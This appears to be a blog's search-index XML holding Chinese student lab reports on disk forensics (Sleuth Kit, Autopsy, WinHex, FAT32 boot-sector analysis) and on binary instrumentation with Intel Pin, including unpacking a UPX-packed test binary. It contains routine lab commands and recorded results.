<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Ddigital-Forensics-Lab-2</title>
    <url>/posts/5d65ccb7.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>学会使用TSK工具对磁盘镜像进行电子数据校验。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>安装有kali linux的虚拟机、磁盘镜像文件dfr-11-mft-ntfs.dd.bz2。</p>
<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
<p>1、使用bzip2命令解压文件 dfr-11-mft-ntfs.dd.bz2 <code>bzip2 -d dfr-11-mft-ntfs.dd.bz2</code></p>
<p>2、使用mmls命令查看磁盘镜像的分区布局，将相关信息记录下来 <code>mmls -t dos dfr-11-mft-ntfs.dd</code>。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_2/1.1.png" alt="运行程序得到的结果" /></p>
<p>3、使用dcfldd命令从磁盘镜像中提取分区镜像 <code>dcfldd if=dfr-11-mft-ntfs.dd bs=512 skip=128 count=2091008 of=ntfs.dd</code></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_2/1.2.png" alt="运行程序得到的结果" /></p>
<p>4、使用fsstat命令显示分区中文件系统的详细信息，查看磁盘详细信息 <code>fsstat -f ntfs ntfs.dd</code></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_2/1.3.png" alt="运行程序得到的结果" /></p>
<p>5、使用fls命令来解析文件系统。-r选项用于递归遍历所有目录 <code>fls -r ntfs.dd</code></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_2/1.4.png" alt="运行程序得到的结果" /></p>
<p>6、使用fls命令显示已删除的文件和目录 <code>fls -r -d ntfs.dd</code></p>
<p>7、使用icat命令恢复被删除的文件，-r表示如果文件被删除，icat将使用文件恢复技术。数字41是被删除文件对应的MFT表项编号，这里的41是Sheliak.txt这个文件对应的。恢复的文件保存到以前缀recovered_开头的文件中 <code>icat -r ntfs.dd 41\&gt;recovered_文件名</code></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_2/1.5.png" alt="运行程序得到的结果" /></p>
<p>8、使用cat命令显示恢复的文件 <code>cat recovered_文件名</code></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_2/1.6.png" alt="运行程序得到的结果" /></p>
<h1 id="试验记录"><a class="markdownIt-Anchor" href="#试验记录"></a> 试验记录</h1>
<table>
<thead>
<tr>
<th>分区的起始扇区地址和分区结束扇区地址</th>
<th>分区的起始扇区地址：0000000128 分区的结束扇区地址：0002091135</th>
</tr>
</thead>
<tbody>
<tr>
<td>分区中文件系统详细信息</td>
<td>FILE SYSTEM INFORMATION -------------------------------------------- File System Type: NTFS Volume Serial Number: 2ACADB0FCADAD5E3 OEM Name: NTFS Volume Name: ntfs Version: Windows XP</td>
</tr>
<tr>
<td>被删除的文件名称（3个）</td>
<td>Sheliak.txt,Vega.txt,Sulafat.txt</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>计算机取证学</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Ddigital-Forensics-Lab-1</title>
    <url>/posts/c46c9d0d.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>理解计算机是如何存储和处理数据的。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>安装有kali linux的虚拟机、可以编译C程序。</p>
<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
<h2 id="task1"><a class="markdownIt-Anchor" href="#task1"></a> Task1</h2>
<p>1、输入<code>touch Task1.c</code> 指令在桌面创造一个空的C语言文件。</p>
<p>2、输入<code>gedit Task1.c</code> 指令使用gedit编辑器打开Task1.c文件。</p>
<p>3、输入<code>gcc Task1.c -o Task1.out</code> 指令编译Task1.c文件，生成Task1.out文件。</p>
<p>4、输入<code>./Task1.out</code> 指令运行Task1.out文件。</p>
<p>5、将显示结果记录到记录表1中。</p>
<table>
<thead>
<tr>
<th style="text-align:center">变量类型</th>
<th style="text-align:center">参数类型</th>
<th style="text-align:center">字节数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><a href="http://student1.id">student1.id</a></td>
<td style="text-align:center">100</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">student1.province</td>
<td style="text-align:center">101</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">student1.age</td>
<td style="text-align:center">102</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">结构体Student</td>
<td style="text-align:center">104</td>
<td style="text-align:center">12</td>
</tr>
</tbody>
</table>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_1/1.1.png" alt="运行程序得到的结果" /></p>
<h2 id="task2"><a class="markdownIt-Anchor" href="#task2"></a> Task2</h2>
<p>1、输入<code>gcc -g Task1.c -o Task1</code> 指令编译Task1.c文件，生成Task1文件。</p>
<p>2、输入<code>gdb Task1</code> 指令启动gdb。</p>
<p>3、输入<code>break 15</code> 指令在第15行设置断点。</p>
<p>4、输入<code>r</code> 指令运行Task1，程序会在第15行停下来。</p>
<p>5、输入<code>x/4bt &amp;student1.id</code> 指令查看student1.id的内存情况；输入<code>x/4bt &amp;student1.province</code> 指令查看student1.province的内存情况；输入<code>x/4bt &amp;student1.age</code> 指令查看student1.age的内存情况；输入<code>x/4bt &amp;student1</code> 指令查看student1的内存情况。</p>
<p>6、将显示结果记录到记录表1中。</p>
<table>
<thead>
<tr>
<th style="text-align:center">变量</th>
<th style="text-align:center">十六进制值的表示</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><a href="http://student1.id">student1.id</a></td>
<td style="text-align:center">0x7fffffffddf4： 10001000 01101111 11111011 00000101</td>
</tr>
<tr>
<td style="text-align:center">student1.province</td>
<td style="text-align:center">0x7fffffffddfc： 00010010 00000000 000000000 00000000</td>
</tr>
<tr>
<td style="text-align:center">student1.age</td>
<td style="text-align:center">0x7fffffffddfc： 00010010 00000000 000000000 00000000</td>
</tr>
<tr>
<td style="text-align:center">结构体Student</td>
<td style="text-align:center">0x7fffffffddf4： 10001000 01101111 11111011 00000101</td>
</tr>
</tbody>
</table>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_1/1.2.png" alt="运行程序得到的结果" /></p>
<h2 id="task3"><a class="markdownIt-Anchor" href="#task3"></a> Task3</h2>
<p>前面步骤都和Task2一致。</p>
<p>1、输入<code>break 10</code> 指令在第10行设置断点。</p>
<p>2、输入<code>r</code> 指令运行Task1，程序会在第10行停下来。</p>
<p>3、输入<code>x/1bx &amp;digits[0]</code> 指令查看digits[0]的内容；输入<code>x/1bx &amp;digits[1]</code> 指令查看digits[1]的内容；输入<code>x/1bx &amp;digits[2]</code> 指令查看digits[2]的内容；输入<code>x/1bx &amp;digits[3]</code> 指令查看digits[3]的内容。</p>
<p>4、将显示结果记录到记录表1中。</p>
<table>
<thead>
<tr>
<th style="text-align:center">数字数组项</th>
<th style="text-align:center">第一项</th>
<th style="text-align:center">第二项</th>
<th style="text-align:center">第三项</th>
<th style="text-align:center">第四项</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">内存地址</td>
<td style="text-align:center">0x7fffffffddf4</td>
<td style="text-align:center">0x7fffffffddf5</td>
<td style="text-align:center">0x7fffffffddf6</td>
<td style="text-align:center">0x7fffffffddf7</td>
</tr>
<tr>
<td style="text-align:center">存储的值</td>
<td style="text-align:center">0x12</td>
<td style="text-align:center">0x34</td>
<td style="text-align:center">0x56</td>
<td style="text-align:center">0x78</td>
</tr>
</tbody>
</table>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_1/1.3.png" alt="运行程序得到的结果" /></p>
]]></content>
      <categories>
        <category>计算机取证学</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Binary-Instrumentation-Analysis</title>
    <url>/posts/5dcef6ef.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>学习一种名为二进制插桩的技术。</p>
<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
<p>二进制插桩技术能够在二进制程序的任何位置插入几乎无限的代码，以观察或修改该二进制程序的行为。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>1. 使用 binary 虚拟机，即在 Lab 2 中已经配置过的环境（包括时间戳）。</p>
<p>2. 实验所需文件位于/home/binary/code/chapter9 目录。</p>
<h1 id="task-1pin-使用入门"><a class="markdownIt-Anchor" href="#task-1pin-使用入门"></a> Task 1：Pin 使用入门</h1>
<p>步骤：</p>
<p>1、输入 <code>cd /pin/pin-3.6-97554-g31f0a167d-gcc-linux/source/tools/ManualExamples 和 make obj-intel64/inscount0.so TARGET=intel64</code> 指令编译生成 <a href="http://inscount0.so">inscount0.so</a>。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/1.1.png" alt="输出结果" /></p>
<p>2、输入 <code>~/pin/pin-3.6-97554-g31f0a167d-gcc-linux/pin -t obj-intel64/inscount0.so -o obj-intel64/inscount0.log -- /bin/ls</code>指令执行插桩分析，并查看inscount0.log 文件中显示得到执行过的指令总数。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/1.2.png" alt="输出结果" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/1.3.png" alt="输出结果" /></p>
<h1 id="task-2profiling-with-pin"><a class="markdownIt-Anchor" href="#task-2profiling-with-pin"></a> Task 2：Profiling with Pin</h1>
<h2 id="331-从起始处分析应用程序"><a class="markdownIt-Anchor" href="#331-从起始处分析应用程序"></a> 3.3.1 从起始处分析应用程序</h2>
<p>步骤：</p>
<p>1、输入 <code>make obj-intel64/profiler.so TARGET=intel64</code> 指令编译生成 <a href="http://profiler.so">profiler.so</a>。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/2.1.png" alt="输出结果" /></p>
<p>2、输入  <code>~/pin/pin-3.6-97554-g31f0a167d-gcc-linux/pin -t ./profiler/obj-intel64/profiler.so -c -s -- /bin/true</code> 指令对/bin/true执行分析。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/2.2.png" alt="输出结果" /></p>
<h2 id="332-将-profiler-附加到运行中的进程"><a class="markdownIt-Anchor" href="#332-将-profiler-附加到运行中的进程"></a> 3.3.2 将 Profiler 附加到运行中的进程</h2>
<p>步骤：</p>
<p>1、输入 <code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code>指令暂时禁用安全机制；输入 <code>nc -l -u 127.0.0.1 9999</code> 指令获取 PID。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/2.3.png" alt="输出结果" /></p>
<p>2、输入  <code>~/pin/pin-3.6-97554-g31f0a167d-gcc-linux/pin -pid 6594 -t ./profiler/obj-intel64/profiler.so -c -s</code> 指令对 PID 为 6594 的进程执行分析。输入 <code>echo \&quot;Testing the profiler\&quot; \| nc -u 127.0.0.1 9999</code> 指令使用另一个 netcat 进程向监听进程发送消息&quot;Testing the profiler&quot;。使用 <code>fg</code> 命令把 netcat 监听进程带到前台，并终止该进程。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/2.4.png" alt="输出结果" /></p>
<p>Q：根据 Pin 执行结果，使用了哪些系统调用？</p>
<p>A：系统调用 0: read，执行了 2 次，占比 28.57%<br />
系统调用 1: write，执行了 1 次，占比 14.29%<br />
系统调用 7: poll，执行了 2 次，占比 28.57%<br />
系统调用 42: connect，执行了 1 次，占比 14.29%<br />
系统调用 45: recvfrom，执行了 1 次，占比 14.29%</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/2.5.png" alt="输出结果" /></p>
<h1 id="task-3automatic-binary-unpacking-with-pin"><a class="markdownIt-Anchor" href="#task-3automatic-binary-unpacking-with-pin"></a> Task 3：Automatic Binary Unpacking with Pin</h1>
<h2 id="342-测试脱壳器"><a class="markdownIt-Anchor" href="#342-测试脱壳器"></a> 3.4.2 测试脱壳器</h2>
<p>步骤：</p>
<p>1、输入 <code>cp /bin/ls packed</code> 和 <code>upx packed</code> 指令对测试二进制文件进行加壳。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/3.1.png" alt="输出结果" /></p>
<p>2、输入 <code>sudo apt-get install --reinstall libxcb-xinerama0</code>指令安装缺少的运行库，安装IDA。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/2.2.png" alt="输出结果" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/2.3.png" alt="输出结果" /></p>
<p>3、在IDA中分析 packed 文件，发现其被加壳。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/3.4.png" alt="输出结果" /></p>
<p>4、输入  <code>/pin/pin-3.6-97554-g31f0a167d-gcc-linux/pin -t obj-intel64/unpacker.so -- ./packed</code> 指令执行解密。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/3.5.png" alt="输出结果" /></p>
<p>5、输入 <code>head unpacker.log</code> 指令查看解密后的文件。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/3.6.png" alt="输出结果" /></p>
<p>6、输入 <code>file unpacked.0x400000-0x41da64_entry-0x40000c</code>指令查看解密后的文件类型。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/3.7.png" alt="输出结果" /></p>
<p>7、输入 <code>strings unpacked.0x400000-0x41da64_entry-0x40000c</code>指令看到脱壳后的二进制文件中包含许多可读的字符串，这表明脱壳成功。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/3.9.png" alt="输出结果" /></p>
<p>8、使用IDA在脱壳后的二进制文件中找到更多的函数，这也说明脱壳是成功的。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/3.10.png" alt="输出结果" /></p>
<p>9、输入 <code>objdump -M intel -d /bin/ls &gt; result_ls</code> 和 <code>objdump -M intel -b binary -mi386 -Mx86-64 -D unpacked.0x400000-0x41da64_entry-0x40000c &gt; result_unpack</code> 指令对比加壳前后的汇编代码.</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/3.11.png" alt="输出结果" /></p>
<p>以 0x2a00处代码为例进行比较。可以看到除了代码地址不同外，二者其余的代码是相同的。地<br />
址不同是因为 objdump 命令缺少节头表而不知道脱壳的二进制文件的预期加载地址。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Binary%20Instrumentation%20Analysis/3.12.png" alt="输出结果" /></p>
]]></content>
      <categories>
        <category>逆向工程与汇编语言</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Ddigital-Forensics-Lab-5</title>
    <url>/posts/179be3c4.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>使用 winhex 对删除的文件进行恢复。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>安装有 winhex 的 windows 系统、shiyan.vhd 文件。</p>
<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
<p>1、将 shiyan.vhd 挂载到C盘。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.1.png" alt="将 shiyan.vhd 挂载到C盘" /></p>
<p>2、找到 MFT 中 paper.zip 的位置。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.2.png" alt="找到 MFT 中 paper.zip 的位置" /></p>
<p>3、ctrl + f 搜索关键词 paper 。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.3.png" alt="搜索关键词 paper" /></p>
<p>4、在上方复制并查找16进制数值。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.4.png" alt="复制16进制数值" /></p>
<p>5、由下图可以获取以下消息：文件大小：1226D8(十进制 1189592)；簇数：1123；首簇号：042D(十进制 1069)。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.5.png" alt="查找16进制数值" /></p>
<p>6、ctrl + g 搜索首簇号的位置。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.6.png" alt="搜索搜簇号的位置" /></p>
<p>7、alt + g 输入文件大小查找末bit的位置。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.7.png" alt="查找末bit的位置" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.8.png" alt="末bit的位置" /></p>
<p>8、保存为paper.zip，解压后发现获得了一个PDF文件，恢复成功。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_5/1.9.png" alt="将 shiyan.vhd 挂载到C盘" /></p>
]]></content>
      <categories>
        <category>计算机取证学</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Ddigital-Forensics-Lab-3</title>
    <url>/posts/2947dde5.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>学会在kali linux中利用autopsy创建实验案例，并利用autopsy对案例进行分析。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>安装有kali linux的虚拟机、磁盘镜像文件thumbimage_fat.dd。</p>
<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
<p>1、打开autopsy取证分析浏览器，<br />
在管理员权限下运行<code>autospsy</code>，登录：<code>http://localhost:9999/autops</code>。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.1.png" alt="运行程序得到的结果" /></p>
<p>2、在autopsy中创建新案例，记录下autopsy计算的镜像文件的哈希值。</p>
<p>案例信息：受攻击web服务器的主机名为<code>www.hacker.ucs.ca</code>，实验中使用的&quot;thumbimage_fat.dd&quot;是在犯罪现场获取的磁盘镜像。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.2.png" alt="计算除MD5哈希值" /></p>
<p>3、利用autopsy进行电子证据磁盘分析。</p>
<p>完成创建后，在案例分析中找到keyword<br />
search，在磁盘镜像中搜索关键字&quot;Wikipedia&quot;,将调查一步一步地深入下去，并回答下列问题。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.3.png" alt="搜索关键字编码为ASCII格式" /></p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_3/1.4.png" alt="搜索关键字编码为Unicode格式" /></p>
<p>问题1：当搜索关键字编码为ASCII格式时，命中次数是多少</p>
<p>答：1次。</p>
<p>问题2：关键字结果所在数据单元的编号（或地址）是什么</p>
<p>答：Unit 8291 (Hex - Ascii)。</p>
<p>问题3：当搜索关键字编码为Unicode格式时，命中次数是多少</p>
<p>答：0次。</p>
]]></content>
      <categories>
        <category>计算机取证学</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Ddigital-Forensics-Lab-4</title>
    <url>/posts/609cd352.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>1、了解 FAT 文件系统的工作原理。<br />
2、依据 FAT 文件系统的残留元数据恢复已删除的文件。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>使用名为&quot;thumbimage_fat.dd&quot;的镜像文件，将其复制到实验环境 kali 中。</p>
<h1 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h1>
<h2 id="task1"><a class="markdownIt-Anchor" href="#task1"></a> Task1</h2>
<p>输入 <code>mmls thumbimage_fat.dd</code> 指令进行磁盘分析：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/1.1.png" alt="运行程序得到的结果" /></p>
<table>
<thead>
<tr>
<th style="text-align:center">第一个分区</th>
<th style="text-align:center">属性</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">在扇区中起始位置</td>
<td style="text-align:center">0x0000000097</td>
</tr>
<tr>
<td style="text-align:center">分区中的扇区数</td>
<td style="text-align:center">2482223</td>
</tr>
<tr>
<td style="text-align:center">分区大小 （MB）</td>
<td style="text-align:center">121.25 MB</td>
</tr>
<tr>
<td style="text-align:center">分区类型</td>
<td style="text-align:center">Win95 FAT32（0x0b）</td>
</tr>
</tbody>
</table>
<h2 id="task2"><a class="markdownIt-Anchor" href="#task2"></a> Task2</h2>
<p>使用 <code>dd if=thumbimage_fat.dd of=partition1.dd bs=512 skip=96 count=2482223</code> 指令将第一个分区复制到新的文件中。其中，if=thumbimage_fat.dd指定输入文件为 &quot;thumbimage_fat.dd&quot;，of=partition1.dd指定输出文件为 &quot;of=partition1.dd&quot;，bs=512表示每次读取512字节，skip=96表示跳过前96个扇区，count=2482223表示读取2482223个扇区。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/2.1.png" alt="运行程序得到的结果" /></p>
<h2 id="task3"><a class="markdownIt-Anchor" href="#task3"></a> Task3</h2>
<p>输入 <code>hexdump -C partition1.dd -n 1024</code> 指令来分析第一个分区的引导扇区：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/3.1.png" alt="运行程序得到的结果" /></p>
<pre><code>   00000000  eb 58 90 4d 53 44 4f 53  35 2e 30 00 02 02 ac 18  |.X.MSDOS5.0.....|
   00000010  02 00 00 00 00 f8 00 00  3f 00 ff 00 61 00 00 00  |........?...a...|
   00000020  9f c9 03 00 aa 03 00 00  00 00 00 00 02 00 00 00  |................|
   00000030  01 00 06 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
   00000040  80 00 29 b9 d3 3d ae 4e  4f 20 4e 41 4d 45 20 20  |..)..=.NO NAME  |
   00000050  20 20 46 41 54 33 32 20  20 20 33 c9 8e d1 bc f4  |  FAT32   3.....|
   00000060  7b 8e c1 8e d9 bd 00 7c  88 4e 02 8a 56 40 b4 41  |&#123;......|.N..V@.A|
</code></pre>
<p>1、FAT 版本:从引导扇区的 0x52 偏移处可以看到 &quot;FAT32 &quot; 字符串,说明这是一个 FAT32 文件系统。</p>
<p>2、保留扇区的大小:从引导扇区的 0x0E 偏移处可以看到保留扇区的数量是 0x18ac,也就是 6316 个扇区。</p>
<p>3、FAT0 的位置:从引导扇区的 0x0E 偏移处可以看到 FAT 区的起始扇区号是 0x18ac,也就是FAT0之前共有6316个扇区，即FAT0的起始地址是第6316个扇区。从引导扇区的 0x16 偏移处可以看到 FAT 表的扇区数是 0x000003aa,也就是每个FAT拥有 938 个扇区，因此FAT0的结束地址为第7253个扇区，因此FAT0的位置为6316-7253个扇区。</p>
<p>4、FAT 的备份数量:从引导扇区的 0x10 偏移处可以看到 FAT 表的备份数是 0x02,也就是 2 个备份。</p>
<p>5、根目录的位置:从引导扇区的 0x2C 偏移处可以看到根目录的起始簇号是 0x00000002,也就是第 2 个簇。从引导扇区的0x0D 偏移处可以看到有 2 个FAT。从引导扇区的 0x0E 偏移处可以看到 FAT 区的起始扇区号是 0x18ac,也就是FAT0之前共有6316个扇区，即FAT0的起始地址是第6316个扇区。从引导扇区的 0x16 偏移处可以看到 FAT 表的扇区数是 0x000003aa,也就是每个FAT拥有 938 个扇区。因此根目录的起始地址为6316 + 938 * 2 = 8192，即第8192个扇区。因此根目录的位置为第2簇，第8192-8193个扇区。</p>
<p>6、簇的大小:从引导扇区的 0x0D 偏移处可以看到每个簇的扇区数为 0x02，也就是 2，每个扇区的大小为 512 kb，因此簇的大小为 1 kb（1024 bytes）。</p>
<p>7、数据区的位置:从根目录 8192。因此数据区的起始位置为第8192个扇区，结束位置为第 248222 个扇区。总簇数为（248222-8192）/2=120015，因此数据区的位置为第 2-120017 个簇。</p>
<p>8、卷标签:从引导扇区的 0x47 偏移处可以看到卷标签是 &quot;NO NAME &quot;。</p>
<p>9、文件系统的扇区数:从引导扇区的 0x20 偏移处可以看到总扇区数是 0x0003c99f,也就是 248223 个扇区。</p>
<p><a href="https://blog.csdn.net/yangyang031213/article/details/79030247">参考文章</a></p>
<p>后来发现了另一种方法（在实验2中）：</p>
<p>输入指令 <code>fsstat partition1.dd</code>：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/3.2.png" alt="运行程序得到的结果" /></p>
<pre><code>FILE SYSTEM INFORMATION
--------------------------------------------
File System Type: FAT32

OEM Name: MSDOS5.0
Volume ID: 0xae3dd3b9
Volume Label (Boot Sector): NO NAME    
Volume Label (Root Directory):
File System Type Label: FAT32   
Next Free Sector (FS Info): 8236
Free Sector Count (FS Info): 239986

Sectors before file system: 97

File System Layout (in sectors)
Total Range: 0 - 248222
* Reserved: 0 - 6315
** Boot Sector: 0
** FS Info Sector: 1
** Backup Boot Sector: 6
* FAT 0: 6316 - 7253
* FAT 1: 7254 - 8191
* Data Area: 8192 - 248222
** Cluster Area: 8192 - 248221
*** Root Directory: 8192 - 8193
** Non-clustered: 248222 - 248222

METADATA INFORMATION
--------------------------------------------
Range: 2 - 3840502
Root Directory: 2

CONTENT INFORMATION
--------------------------------------------
Sector Size: 512
Cluster Size: 1024
Total Cluster Range: 2 - 120016

FAT CONTENTS (in sectors)
--------------------------------------------
8192-8193 (2) -&gt; EOF
8194-8211 (18) -&gt; EOF
8214-8237 (24) -&gt; EOF
</code></pre>
<p>从输出结果中可以直接得出：</p>
<p>1、FAT版本：FAT32。</p>
<p>2、保留扇区的大小：6316个扇区。</p>
<p>3、FAT0的位置：6316-7253个扇区。</p>
<p>4、FAT的备份数量：2个备份。</p>
<p>5、根目录的位置：第2个簇，第8192-8193个扇区。</p>
<p>6、簇的大小：1 kb（1024 bytes）。</p>
<p>7、数据区的位置：第 2-120017 个簇。</p>
<p>8、卷标签：NO NAME。</p>
<p>9、文件系统的扇区数：248223个扇区。</p>
<h2 id="task4"><a class="markdownIt-Anchor" href="#task4"></a> Task4</h2>
<p>输入 <code>stat -c '%b %s' readme.txt</code> 指令获取 readme.txt 文件的信息，其中 %b4 获取 readme.txt 的文件扇区数，%s 获取 readme.txt 的文件大小。</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Digital%20Forensics/Lab_4/4.1.png" alt="运行程序得到的结果" /></p>
<p>1、文件大小（十进制）单位：8827。</p>
<p>2、起始簇号（十进制）：3。</p>
<p>3、起始扇区地址（十进制）。注意，需要将簇号转换为扇区地址：8194。</p>
<p>4、分配给文件&quot;readme.txt&quot;的簇数：扇区数为18，一个簇包含两个扇区，因此簇数为9。</p>
<p>5、分配给文件&quot;readme.txt&quot;的扇区数：18。</p>
<p>6、按顺序列出分配给文件&quot;readme.txt&quot;的簇链：3，4，5，6，7，8，9，10，11。</p>
<h2 id="task5"><a class="markdownIt-Anchor" href="#task5"></a> Task5</h2>
<p>1、输入 <code>cd /mnt</code> 指令切换到/mnt 目录，并输入 <code>sudo mkdir forensics</code> 指令创建一个名为&quot;forensics&quot;的目录。</p>
<p>2、输入 <code>sudo mount -o rw /home/kali/Desktop/partition1.dd /mnt/forensics</code> 指令将第二题提取的 FAT 分区挂载到具有读写访问权限的/mnt/forensics 目录下。</p>
